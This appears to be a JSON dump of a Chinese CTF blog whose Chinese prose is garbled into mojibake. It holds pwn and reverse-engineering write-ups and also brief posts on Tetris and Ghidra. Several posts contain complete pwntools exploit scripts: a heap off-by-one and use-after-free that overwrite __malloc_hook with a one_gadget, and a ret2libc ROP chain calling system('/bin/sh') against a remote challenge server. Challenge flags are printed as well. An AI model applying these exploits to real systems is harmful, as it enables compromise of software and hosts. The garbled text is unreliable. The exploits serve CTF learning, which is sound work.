ç„¶åå¾ˆè›‹ç–¼çš„æ˜¯ï¼Œæˆ‘payloadæ“å®Œåæ‰æœ‰äººå’Œæˆ‘è¯´æ¯”èµ›çš„ç¯å¢ƒæ˜¯18.04æœ¬ç€æ‡’ä½†æ˜¯è¦å‡†ç¡®çš„æ€åº¦é‡æ–°æ“äº†ä¸ªpayload from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./pwn&#39;) elf=ELF(&#39;./pwn&#39;) libc = elf.libc def regs(): n.recvuntil(&#39;name?&#39;) n.sendline(&quot;nepire&quot;) def choice(idx): n.recvuntil(&#39;Your choice &gt; &#39;) n.sendline(str(idx)) def new(size,content): choice(1) n.recvuntil(&quot;Size &gt;&quot;) n.sendline(str(size)) n.recvuntil(&#39;Content &gt; &#39;) n.send(content) def show(): choice(2) def free(): choice(3) def edit(size,content): choice(4) n.recvuntil(&quot;Size &gt; &quot;) n.sendline(str(size)) n.recvuntil(&quot;Content &gt; &quot;) n.send(content) regs() new(0x18,&#39;0000&#39;) edit(0x18+7,&#39;a&#39;*0x18+p32(0xd91)) new(0x1000,&#39;1111&#39;) new(0x68,&#39;a&#39;*8) show() libcbase = u64(n.recvuntil(&#39;\\x7f&#39;)[-6:]+&#39;\\x00\\x00&#39;)-0x3ec2a0 print hex(libcbase) malloc_hook = libcbase + libc.sym[&#39;__malloc_hook&#39;] one_gadget = libcbase + 0x4f322 free() edit(0x68,p64(malloc_hook-0x10+1-0x8)) new(0x68,&#39;aaaa&#39;) new(0x68,&#39;a&#39;*7+p64(one_gadget)*3) choice(1) n.recvuntil(&#39;&gt;&#39;) n.sendline(&#39;114&#39;) n.interactive() flodbgå„ç§åè°ƒè¯•ååç¼–è¯‘çš„ä¸€é¢˜ï¼Œä½†æ˜¯é çŒœä¹Ÿå¾ˆå®¹æ˜“çŒœå‡ºæ¥ï¼Œè¿™é‡Œå°±è¯¦ç»†å†™ä¸€ä¸‹æ€ä¹ˆçŒœå‡ºæ¥çš„ åç¼–è¯‘åçœ‹mainå‡½æ•°å…ˆæ˜¯é€å­—ç¬¦è¾“å…¥ç›´åˆ°v3==&amp;v7ï¼Œä¹Ÿå°±æ˜¯ä»[rbp-4D8]å¼€å§‹å†™ï¼Œå†™åˆ°[rbp-48C]æ—¶åœæ­¢ï¼Œä¹Ÿå°±æ˜¯76byteï¼Œç”±äºè¿™é‡Œæ˜¯intå°±è¿˜è¦é™¤4ï¼Œä¹Ÿå°±æ˜¯19ä¸ªå­—ç¬¦ æ¥ç€æ˜¯é¢„å®šä¹‰ä¸€ä¸ªé•¿åº¦ä¸º19çš„å­—ç¬¦ä¸²ï¼Œçœ‹åˆ°æœ‰flagå’Œ{}å¾ˆå®¹æ˜“çŒœåˆ°flagæ˜¯ç”±è¿™ä¸²å˜åŒ–æ¥çš„ ç”±äºè¿™é‡Œæœ‰ä¸ªç®€å•çš„åè°ƒè¯•ï¼Œæ‰€ä»¥å…ˆpatchä¸€ä¸‹ patchå‰ patchå ç„¶åç”¨gdbå»è°ƒè¯•å°±èƒ½å‘ç°å…¶å®æ˜¯è¿›è¡Œ15è½®func3çš„åŠ å¯† 0123456789abcdefghi func3(f[5],2,7,14) 0123456cdefghi789ab func3(f[2],4,6,17) 012345defghi789ab6c func3(f[9],3,5,10) 012345defghi9ab6c78 func3(f[0],6,9,15) 012345ghi9abdef6c78 func3(f[11],3,6,8) 012345ghi9abde78f6c func3(f[5],1,5,14) 012345abde78f6cghi9 func3(f[0],0,2,19) 2345abde78f6cghi901 func3(f[3],3,5,16) 2345ab78f6cghi901de func3(f[15],1,3,4) 2345ab78f6cghi90e1d func3(f[8],3,6,11) 2345ab78f6c90e1dghi func3(f[0],0,7,19) 8f6c90e1dghi2345ab7 func3(f[16],0,2,3) 8f6c90e1dghi23457ab func3(f[10],0,2,9) 8f6c90e1dg23457abhi func3(f[11],1,3,8) 8f6c90e1dg237abhi45 func3(f[16],0,2,3) 8f6c90e1dg237abh5i4 å¹¶ä¸”å¯ä»¥å‘ç°åªæ˜¯å¯¹è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œç§»ä½ï¼Œæ²¡æœ‰å¯¹å­—ç¬¦æœ¬èº«è¿›è¡Œæ“ä½œï¼Œé‚£æœ€ç®€å•çš„å°±æ˜¯å¯¹æ¯”ç„¶åæ›¿æ¢ flag{My-StL_R0T@+3} è™½ç„¶è¿™æ ·èƒ½è½»æ¾æ‹¿åˆ°flagï¼Œä½†ä¹Ÿå¾—å°Šé‡ä¸‹å‡ºé¢˜äººå†™é‚£ä¹ˆä¸€å¤§ä¸²åŠ å¯†æ˜¯çœŸçš„ç´¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å»åˆ†æè¿™åŠ å¯†è¿‡ç¨‹å…ˆåˆ†æä¸‹ç¬¬ä¸€æ¬¡åŠ å¯† ç®€å•è°ƒè¯•å°±èƒ½å¾—åˆ°è¿™ä¸ªç»“æœ ç„¶åæˆ‘ä»¬ä¸éš¾çœ‹å‡ºè¿™ä¸ªçš„é€šé¡¹ ç®€å•çš„ç”¨ç¬¬äºŒç¬¬ä¸‰è®ºè¯ä¸‹ æ¯”èµ›æ—¶ç›´æ¥èµ°æ·å¾„æ˜¯çˆ½ï¼Œä½†èµ›åå†ä¸€æ­¥æ­¥èµ°è¿˜æ˜¯æŒºæœ‰æ„æ€çš„","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"19RoarCTFè®°å½•","slug":"19RoarCTFè®°å½•","date":"2019-11-05T04:31:01.000Z","updated":"2021-02-22T08:49:52.215Z","comments":true,"path":"2019/11/05/19RoarCTFè®°å½•/","link":"","permalink":"/2019/11/05/19RoarCTFè®°å½•/","excerpt":"","text":"æ¯”èµ›æ—¶æ­£å¥½é‡ä¸Šä½œä¸šä¸€å¤§å †ï¼Œç²—ç•¥çš„çœ‹äº†ä¸€é¢˜å°±å»èµ¶ä½œä¸šäº†ï¼Œèµ›åè¿˜æ˜¯æ¥é‡æ–°çœ‹ä¸€éé¢˜ç›® easypwn Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled é˜²æŠ¤å…¨å¼€åç¼–è¯‘çœ‹ä¸€ä¸‹ æ ‡å‡†èœå•æ¡†æ¶ ç„¶ååˆæ˜¯æ„‰å¿«çš„é€†ç»“æ„ä½“æ—¶é—´ è¿™é‡Œå°±çœç•¥åˆ†æè¿‡ç¨‹ struct note { int inuse; int size; char *content; } æˆ‘ä»¬å¯ä»¥çœ‹åˆ°createçš„åŠŸèƒ½åªåˆå§‹åŒ–äº†æ–°chunkï¼Œå¹¶æœªå¾€contentå†™ä¸œè¥¿ ç„¶åç®€å•å®¡è®¡è¿‡åå°±èƒ½å‘ç°æœ‰ä¸ªå¾ˆåƒµç¡¬çš„æ¼æ´ åœ¨å¾€chunk_contentå†…å†™ä¸œè¥¿æ—¶çš„sizeæ˜¯cmp_minçš„è¿”å›å€¼ï¼Œè€Œé—®é¢˜å°±å‡ºåœ¨cmp_miné‡Œ è¿™é‡Œåƒµç¡¬åœ¨äºè¿™ä¸ªé¢å¤–å¤šå‡ºçš„ifï¼Œæœ¬æ¥çŒœæµ‹å¯èƒ½æ˜¯æƒ³è¾“å…¥çš„sizeæ˜¯å¸¦â€™\\nâ€™çš„ä½†å‘ç°è¿™ä¹Ÿä¸å¯¹å°±henå°¬ æ€»ç»“ä¸‹ç°åœ¨å¾—åˆ°çš„å¯åˆ©ç”¨ç‚¹ 1.æœ€å¤§å¯åˆ›å»ºsize=0x100çš„chunk 2.editå­˜åœ¨offbyoneæ¼æ´ 3.èœå•é€‰æ‹©ç”¨çš„scanf é‚£ä¹ˆå…ˆå°è¯•åˆ©ç”¨off by oneæ³„éœ²å‡ºlibc è¿™é‡Œæœ‰ä¸ªç»†èŠ‚æ˜¯å®ƒæ²¡æœ‰ç”¨mallocåˆ›å»ºå †è€Œæ˜¯callocï¼Œä½†æ²¡å¿…è¦å»çº ç»“ï¼Œå› ä¸ºè§¦å‘malloc_hookçš„ä¸æ˜¯è¿™é‡Œçš„malloc æ¥ç€å°±æ˜¯å¾ˆç›´æ¥çš„ï¼Œuafæ”¹fdåˆ°malloc_hookåæŠŠmalloc_hookæ”¹æˆone_gadgetå†ç”¨doublefreeæŠ¥é”™é‡Œçš„mallocè§¦å‘getshell from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./easy_pwn&#39;) elf = ELF(&#39;./easy_pwn&#39;) libc = elf.libc def choice(idx): n.recvuntil(&#39;choice: &#39;) n.sendline(str(idx)) def new(size): choice(1) n.recvuntil(&#39;size: &#39;) n.sendline(str(size)) def write(idx,size,content): choice(2) n.recvuntil(&#39;index: &#39;) n.sendline(str(idx)) n.recvuntil(&#39;size: &#39;) n.sendline(str(size)) n.recvuntil(&#39;content:&#39;) n.send(content) def free(idx): choice(3) n.recvuntil(&#39;index: &#39;) n.sendline(str(idx)) def show(idx): choice(4) n.recvuntil(&#39;index: &#39;) n.sendline(str(idx)) new(0x18)#0 new(0x18)#1 new(0x68)#2 new(0x10)#3 write(0,0x18+10,&#39;a&#39;*0x18+&#39;\\x91&#39;) #gdb.attach(n) free(1) new(0x18)#1|2 show(2) libcbase = u64(n.recvuntil(&#39;\\x7f&#39;)[-6:]+&#39;\\x00\\x00&#39;)-0x3c4b78 print hex(libcbase) malloc_hook = libcbase + libc.sym[&#39;__malloc_hook&#39;] one_gadget = libcbase +0xf02a4 #gdb.attach(n) free(1) new(0x68) free(2) write(1,0x8,p64(malloc_hook-0x18+5)) new(0x68) new(0x68) write(4,0x10+3,&#39;aaa&#39;+p64(one_gadget)*2) free(2) free(1) n.interactive() continueâ€¦â€¦","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"é»‘ç›¾æ¯è®°å½•","slug":"é»‘ç›¾æ¯è®°å½•","date":"2019-11-05T04:30:20.000Z","updated":"2021-02-22T08:49:52.259Z","comments":true,"path":"2019/11/05/é»‘ç›¾æ¯è®°å½•/","link":"","permalink":"/2019/11/05/é»‘ç›¾æ¯è®°å½•/","excerpt":"","text":"ç¬¬ä¸€æ¬¡æ‰“é»‘ç›¾æ¯ï¼Œæ‹¿äº†ç‰¹ç­‰ï¼Œwebå¸¦å“¥å¤ªå¼ºäº†ï¼Œè¿™é‡Œè®°å½•ä¸‹å‡ é¢˜äºŒè¿›åˆ¶çš„é¢˜ choice LIBC2.23 32ä½å¼€äº†NXï¼Œæ„Ÿè§‰æŒºç®€å•çš„idaæ‰“å¼€çœ‹ä¸€ä¸‹å¾ˆå®¹æ˜“å°±å‘ç°æœ‰ä¸€ä¸ªoffbyone æ¥ä¿®æ”¹sizeæ¥é€ æˆæ ˆæº¢å‡ºç„¶åæˆ‘ä»¬åœ¨åé¢çœ‹åˆ°ç”¨è¿™ä¸ªå…¨å±€sizeæ¥readbufçš„å‡½æ•°å·å·åæ§½ï¼ˆåƒåœ¾é¢˜ç›®ï¼Œä¸ºå‡ºé¢˜è€Œå‡ºé¢˜ï¼‰è¿™é‡Œå°±ç›´æ¥ret2libcäº†ï¼Œä¹Ÿä¸éœ€è¦ä»€ä¹ˆæŠ€å·§ easypwnåæ§½ä¸€ä¸‹ï¼Œæ¯”èµ›å®Œå…¨ä¸çŸ¥é“è¿™è¿˜æ˜¯åŸé¢˜ï¼Œèµ›åå’ŒMaisçš„å¸ˆå‚…èŠçš„æ—¶å€™æ‰çŸ¥é“è¿™æ˜¯ä»–ä»¬Rctf2015çš„åŸé¢˜ï¼Œpayloadéƒ½ä¸ç”¨æ”¹çš„é‚£ç§ï¼Œæˆ‘å°±åªèƒ½å‘µå‘µäº†ï¼ˆå†åæ§½**ï¼‰å¾ˆå¸¸è§„çš„æ ˆæº¢å‡ºæ¨¡æ¿ï¼Œä½†è¿™é‡Œstrcpyä¼šäº§ç”Ÿ\\0æˆªæ–­ï¼Œè€Œä¸”æ ˆä¸Šè¿”å›åœ°å€åé¢æ˜¯0x18çš„å¡«å……å­—ç¬¦ï¼Œéœ€è¦æ‰¾pop4çš„gadgetç„¶åå°±ç®—æ­£å¸¸ret2libcäº† Reverse02è¿™é¢˜æ²¡å¾—è¾©ï¼Œæ˜¯æˆ‘è„‘å­åäº†ï¼ŒæŠŠæœ€åä¸€ä¸ªèŠ±æ‹¬å·ä¹Ÿå¼‚æˆ–äº†æˆ‘ä»¬çœ‹ä¸€ä¸‹ç¨‹åº çœ‹ä¼¼Creakmeï¼Œå®é™…æ ¹æœ¬ç‚¹ä¸åŠ¨ï¼Œè¦ä¹ˆå‡ºé¢˜äººè„‘æŠ½äº†ï¼Œè¦ä¹ˆä¸»åŠæ–¹æ”¹é¢˜æ²¡åˆ å¥½æˆ‘ä»¬idaé™æ€åˆ†æä¸€ä¸‹è¿›æ¥å°±çœ‹åˆ°è¿™ä¸ªå‡½æ•°ï¼Œå®é™…ä¸Šä¹Ÿå°±è¿™ä¸ªå‡½æ•°å¼‚æˆ–ä¸€ä¸‹å°±å‡ºflagäº†ï¼Œå¯èƒ½æ˜¯æœ€è¿‘æƒ³é—®é¢˜è‡ªå·±ä¼šåœ¨é‚£ç»•ï¼Œæˆ‘å°±æ²¡é‚£ä¹ˆç›´æ¥å°±å»è§£äº†æŸ¥çœ‹äº†ä¸‹è°ƒç”¨å‘ç°å‰é¢è¦è¿‡ä¸ªcheckæ‰èƒ½è¿›è¿™ä¸ªå‡½æ•° çœ‹ä¸€ä¸‹æ¡ä»¶æˆ‘ä»¬å¾ˆå®¹æ˜“å°±èƒ½çŸ¥é“è¿™ä¸ªthisæ˜¯æˆ‘ä»¬è¾“å…¥çš„ï¼Œç®€å•å¤„ç†ä¸‹åç¼–è¯‘ç»“æœç„¶åå†æŠŠRkeyæå–å‡ºæ¥æˆ‘ä»¬å¤§è‡´èƒ½æƒ³åˆ°ä»–åŸæœ¬å¯èƒ½æ˜¯æƒ³è®©æˆ‘ä»¬å…ˆé€†å‡ºæ³¨å†Œç ç„¶åè¾“å…¥éªŒè¯ç è°ƒç”¨è¾“å‡ºflagçš„å‡½æ•°ï¼Œç„¶åä»–è¿™ä¸ªæ¯”è¾ƒå°´å°¬çš„æ˜¯ï¼Œå‰é¢è¿™ä¸€å †æƒ³è¦ä½ é€†å‡ºæ³¨å†Œç çš„ä¸œè¥¿å®Œå…¨æ²¡ç”¨ï¼Œç›´æ¥é€†è¾“å‡ºflagçš„å‡½æ•°å°±èƒ½å¾—åˆ°flagæ•´ç†ä¸‹è¿™ä¸ªç¨‹åºçš„ä»£ç ç„¶åæœ€ç®€å•çš„åšæ³•å°±æ˜¯æŠŠDstæ”¹æˆæ•°ç»„å°±èƒ½çœ‹å‡ºæ¥äº† flag{VEg46R4m04f7607c61e732732a0d4f737f34d674f}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"EasyCrackMeåˆå­¦z3","slug":"EasyCrackMeåˆå­¦z3","date":"2019-11-05T04:29:45.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/EasyCrackMeåˆå­¦z3/","link":"","permalink":"/2019/11/05/EasyCrackMeåˆå­¦z3/","excerpt":"","text":"TokyoWesternsçš„é¢˜ç›®å®åœ¨æœ‰æ„æ€ï¼Œåªèƒ½æ°´æ°´çƒ­èº«é¢˜æ··æ··æ—¥å­ å…ˆä»æ–‡ä»¶çš„é€†å‘å¼€å§‹ ä¸€å¼€å§‹å¾ˆæ˜æ˜¾ï¼Œflagé•¿åº¦ä¸º39ä¸”å‰6ä½ä¸ºTWCTF{æœ€åä¸€ä½æ˜¯ } så°±ç›¸å½“äºflag æ¥ç€æ˜¯ä¸€æ®µcheckï¼Œç¨å¾®æŠŠå˜é‡ç±»å‹ä¿®æ”¹ä¸‹çœ‹èµ·æ¥èˆ’æœäº› èƒ½çœ‹å‡ºæ¥è¿™æ˜¯å¯¹flagé‡Œ[0-9][a-f]è¿›è¡Œè®¡æ¬¡ï¼Œå¹¶ä¸”è¦ç¬¦åˆcont_checké‡Œçš„å€¼ æ¥ç€æ˜¯ä¸¤ç«¯ç›¸ä¼¼çš„éªŒè¯ï¼Œç›´æ¥æ‰”ä¸Šæ¥ä¿®æ”¹åçš„ æ¥ç€å°±æ˜¯å¯¹[s1,s2,s3,s4]è¿›è¡Œcheck ç„¶åæˆ‘ä»¬è€æ ·å­æŠŠæ•°æ®ä»åœ°å€ä¸­æå–å‡ºæ¥ ç„¶åæŠŠä¸Šé¢çš„æ•´ç†ä¸€ä¸‹å°±å˜æˆ ç„¶åå°±ç›´æ¥ç”¨z3å»æ±‚è¿™ä¸ªçº¦æŸ ç„¶åä¸‹é¢ä¹Ÿæ˜¯ä¸ªç®€å•çš„åˆ¤æ–­ç„¶åå¯¹æ¯”ï¼Œå†æŠŠè¿™ä¸ªæ¡ä»¶åŠ åˆ°çº¦æŸæ¡ä»¶ä¸­ ç„¶åæ˜¯æ£€éªŒasciiç ä¹‹å’Œæ˜¯å¦ä¸º1160å’Œflagçš„æŸäº›ä½æ˜¯å¦ä¸ºæŸä¸ªå€¼ è¿™ä¸¤ä¸ªæ•´ç†ä¸‹åŠ å…¥z3è„šæœ¬é‡Œå°±æ˜¯ æ¥ç€å°±æ˜¯æœ€å¼€å§‹çš„ç»Ÿè®¡å­—ç¬¦å‡ºç°ä¸ªæ•°çš„çº¦æŸè¿™ä¸ªå·¨è›‹ç–¼ï¼Œå½“æ—¶ä¸çŸ¥é“z3è¦ç”¨Ifå‡½æ•°ï¼ˆå¤§å†™Iå°å†™fï¼‰ç”¨ifå¼„äº†åŠå¤©unsat æœ€ç»ˆä»£ç  TWCTF{df2b4877e71bd91c02f8ef6004b584a5}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"T-Spin_from_TetrisOnlinePoland","slug":"T-Spin-from-TetrisOnlinePoland","date":"2019-11-05T04:29:05.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/T-Spin-from-TetrisOnlinePoland/","link":"","permalink":"/2019/11/05/T-Spin-from-TetrisOnlinePoland/","excerpt":"","text":"æœ€è¿‘æ²‰è¿·tetrisï¼Œçœ‹äº†å¤§ä½¬ä»¬çš„æ“ä½œçœŸçš„è¶Šæ¥è¶Šè§‰å¾—è‡ªå·±å®›è‹¥ä¸€ä¸ªæ ‘æ‡’ï¼Œæ‰€ä»¥ä¹Ÿè¦å¼€å§‹å¯¹Tetrisä¸­çš„T-Spinè¿›è¡Œå­¦ä¹ å’Œç ”ç©¶ T-spinåŸç†åœ¨ç°ä»£ç‰ˆçš„ä¿„ç½—æ–¯æ–¹å—ä¸­ï¼Œæœ‰ç€ä¸€ç§ç§°ä¸ºè¸¢å¢™çš„åˆ¤å®šï¼Œå…·ä½“æ¥è¯´å°±æ˜¯å½“Tå—ä¸­é•¿è¾¹è¾¹è´´ç€å·¦å³è¾¹ç•Œçš„æ—¶å€™ï¼Œè€ç‰ˆçš„ä¼šå¤„äºæ— æ³•æ—‹è½¬çš„çŠ¶æ€ï¼Œè€Œç°ä»£ä¿„ç½—æ–¯æ–¹å—åŠ å…¥äº†è¸¢å¢™åˆ¤å®šç›¸å½“äºå¯ä»¥æŠŠæ–¹å—é€šè¿‡æ—‹è½¬æŠŠæ–¹å—æ—‹è¿›ä¸€ä¸ªæœ¬æ¥ä¸å¯èƒ½æ”¾è¿›å»çš„åœ°æ–¹ T-spinå¸¸ç”¨æ¨¡å‹æ¨¡å‹å¾ˆå¤šç§ï¼Œé‡åˆ°ä¸€ä¸ªå•å—çš„å‘å°±å¯ä»¥è€ƒè™‘ç”¨zæˆ–så—å»ç»„ä¸€ä¸ªT-spin double è¿˜æœ‰ä¸€ç§å‘å‹å°±æ˜¯æœ‰ä¸ªTå—å‘ï¼Œä½†è¾¹ç¼˜é«˜åº¦å·®å¯èƒ½ä¸ºä¸¤åˆ°ä¸‰å±‚ï¼Œå¦‚æœæ˜¯ä¸€å±‚çš„è¯ç›´æ¥å¾€ä¸ŠåŠ ä¸ªç›–å­å°±èƒ½T-spin doubleäº† å¦‚æœä¸ºä¸¤å±‚å¯ä»¥è€ƒè™‘ç”¨Zï¼ŒSå—å»å¡ä¸€ä¸ªç›–å­ï¼Œå¦‚æœç©ºé—´è¶³å¤Ÿä¹Ÿå¯ä»¥è€ƒè™‘ç”¨Læˆ–Jå—å»å¡ç›–å­ å¦‚æœæ˜¯ä¸‰å±‚çš„è¯å°±åªèƒ½é Læˆ–Jå¡ç›–å­äº†ï¼Œå››å±‚ä»¥ä¸Šè€ƒè™‘å †é«˜è¿comboå§ å¼€å±€ç”¨å®šå¼","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"Ghidra_9.0å·¥å…·å­¦ä¹ ","slug":"Ghidra-9-0å·¥å…·å­¦ä¹ ","date":"2019-11-05T04:28:07.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/Ghidra-9-0å·¥å…·å­¦ä¹ /","link":"","permalink":"/2019/11/05/Ghidra-9-0å·¥å…·å­¦ä¹ /","excerpt":"","text":"æ–°å‡ºäº†ä¸€ä¸ªå ªæ¯”idaçš„åç¼–è¯‘å·¥å…·ï¼Œè™½ç„¶åˆ°ç°åœ¨éƒ½è¿˜æ²¡å¼€æºçš„æ ·å­ï¼Œå…ˆæŠŠä¸€äº›ç®€å•çš„æ“ä½œè®°å½•ä¸€ä¸‹ å¯¼å…¥biniï¼šæ‰“å¼€éœ€è¦æŸ¥çœ‹çš„ç¨‹åº Renamel:ä¿®æ”¹å˜é‡åctrl+l : ä¿®æ”¹å˜é‡ç±»å‹ (â€œ4byte:intâ€,â€8byteâ€:â€longâ€,â€8byteâ€:â€size_tâ€) 3.åç¼–è¯‘ ctrl+e : å¯¹é€‰ä¸­çš„å‡½æ•°è¿›è¡Œåç¼–è¯‘ 4.å»ºç«‹ç»“æ„ä½“ Data Types-&gt;å³é”®å¯¹åº”çš„filename-&gt;new-&gt;structure ä¿®æ”¹DataTypeä¸ºç»“æ„ä½“å†…å…ƒç´ çš„ç±»å‹ï¼Œç„¶åæ”¹nameä½¿åç¼–è¯‘å¯è¯»æ€§æ›´å¥½ å»ºå®Œå­˜å¥½å°±å¯ä»¥ä¿®æ”¹å¯¹åº”çš„å˜é‡ç±»å‹ä¸ºè¿™ä¸ªç»“æ„ä½“æŒ‡é’ˆ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"3å°æ—¶èƒ½æ”»ç•¥çš„pwnablekr","slug":"3å°æ—¶èƒ½æ”»ç•¥çš„pwnablekr","date":"2019-11-05T04:27:21.000Z","updated":"2021-02-22T08:49:52.203Z","comments":true,"path":"2019/11/05/3å°æ—¶èƒ½æ”»ç•¥çš„pwnablekr/","link":"","permalink":"/2019/11/05/3å°æ—¶èƒ½æ”»ç•¥çš„pwnablekr/","excerpt":"","text":"çªç„¶å°±å‘ç°è‡ªå·±å¥½åƒè¿˜çœŸæ²¡æœ‰å»å¥½å¥½åšè¿‡ä¸€æ¬¡pwnableçš„é¢˜ç›®ï¼Œäºæ˜¯ä¹çœ‹äº†çœ‹æ—¶é—´è¡¨ï¼Œæ™šä¸Šèƒ½ç©ºå‡º3å°æ—¶æ¥ï¼Œæ‰€ä»¥å°±æ„‰å¿«çš„å†³å®šå¡«ä¸€ä¸‹ä¹‹å‰åŸºç¡€éƒ½æ˜¯çæçš„å‘äº†emmmmmå¥½éº»çƒ¦æ‰åšä¸åˆ°10é¢˜æ˜å¤©ä¸€å®šæŠŠwpå†™äº† âœ kr ls 01fd 03bof 05passcode 07input 09mistake 14cmd1 19unlink 02collision 04flag 06random 08leg 10shellshock 16uaf","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"FireShellCTF2019åæ€","slug":"FireShellCTF2019åæ€","date":"2019-11-05T04:26:45.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/FireShellCTF2019åæ€/","link":"","permalink":"/2019/11/05/FireShellCTF2019åæ€/","excerpt":"","text":"å®åœ¨æ˜¯ä¸åº”è¯¥ï¼Œèµ›åçœ‹äº†ä¸‹Pwnæœ€åä¸€é¢˜çš„EXPåçœäº†ä¸‹ï¼Œè¦æ˜¯èƒ½ä¸“æ³¨å»åˆ†æè¿˜æ˜¯èƒ½æ“å‡ºæ¥çš„ï¼Œç»“æœåˆ°åé¢ä¹Ÿåªåšå‡ºæ¥äº†å¸¸è§„çš„ä¸‰é¢˜ï¼Œä¸æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é˜¶æ®µç»“æŸï¼Œå†™å®Œè¿™ç¯‡æ€»ç»“å°±å»è‚19WFçš„å‚å±•å“äº†ï¼Œæ¯”èµ›ä¼°è®¡ä¹Ÿè¦åœä¸€æ®µæ—¶é—´æ‰“ä¸äº†ã€‚ leaklessâœ leakless checksec leakless [*] &#39;/home/Ep3ius/CTF/pwn/process/2019-FireShellCTF/leakless/leakless&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) å¾ˆåŸºç¡€çš„32ä½ret2libcæ„é€ ROPæ¥putså‡ºputs_addrï¼Œé¢˜ç›®æ²¡ç»™libcï¼Œä½†libc-searchæœå¾—åˆ°libc,é€šè¿‡puts_symæ¥è®¡ç®—å‡ºlibc_baseï¼Œç„¶åå†è®¡ç®—å‡ºsystemå’Œ/bin/shçš„åœ°å€,æœ€åæ„é€ ROPé“¾æ‰§è¡Œsystem(&#39;/bin/sh&#39;)getshell EXP#! /usr/bin/env python # -*- coding: utf-8 -*- # Distributed under terms of the MIT license. # Author = nepire from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) # n = process(&#39;./leakless&#39;) n = remote(&#39;35.243.188.20&#39;,2002) elf = ELF(&#39;./leakless&#39;) libc = ELF(&#39;./libc.so&#39;) puts_got = elf.got[&#39;puts&#39;] puts_plt = elf.plt[&#39;puts&#39;] pop_ret = 0x080483ad feedme = 0x080485cb payload = &#39;a&#39;*0x48+&#39;aaaa&#39;+p32(puts_plt)+p32(pop_ret)+p32(puts_got)+p32(feedme) # n.recv() n.sendline(payload) libc_base = u32(n.recv(4))-libc.sym[&#39;puts&#39;] print &quot;libc_base:&quot;,hex(libc_base) payload = &#39;a&#39;*0x4c + p32(libc_base + libc.sym[&#39;system&#39;])+&#39;aaaa&#39;+p32(libc_base+libc.search(&#39;/bin/sh&#39;).next()) n.sendline(payload) n.interactive() FLAGF#{y3ah!!_y0u_d1d_1t!_C0ngr4tz} casinoâœ casino checksec casino [*] &#39;/home/Ep3ius/CTF/pwn/process/2019-FireShellCTF/casino/casino&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) å¼€å§‹è¾“å…¥nameçš„æ—¶å€™æœ‰ä¸€ä¸ª0x10byteçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç„¶åæ¥ç€æ˜¯100æ¬¡ä¼ªéšæœºæ•°çš„åˆ¤å®šï¼Œä¸€å¼€å§‹æ²¡ç»†çœ‹ç›´æ¥æ“äº†100æ¬¡åˆ¤å®šæˆåŠŸçš„payloadï¼Œå‘ç°æ‹¿ä¸åˆ°flagï¼Œåæ¥ä»”ç»†çœ‹äº†ä¸‹è¦æ±‚æ˜¯æˆåŠŸçš„æ¬¡æ•°å¤§äº100æ¬¡ï¼Œæ­£å¸¸æ¥è¯´æ˜¯ä¸å¯èƒ½çš„ï¼Œä½†å®ƒåˆ¤å®šæˆåŠŸåç´¯åŠ çš„æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡betè€Œä¸æ˜¯count++æˆ–count+=1ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¦‚æœæŠŠbetæ”¹æˆå¤§äº1çš„å€¼å°±å¯ä»¥è®©æœ€ç»ˆåˆ¤æ–­æˆåŠŸæ¬¡æ•°æ—¶å¤§äº100,è€Œå‰é¢çš„16byteæ ¼å¼åŒ–å­—ç¬¦ä¸²å°±è¶³å¤Ÿç”¨æ¥ä¿®æ”¹ä»»æ„åœ°å€çš„1byteï¼Œè™½ç„¶å› 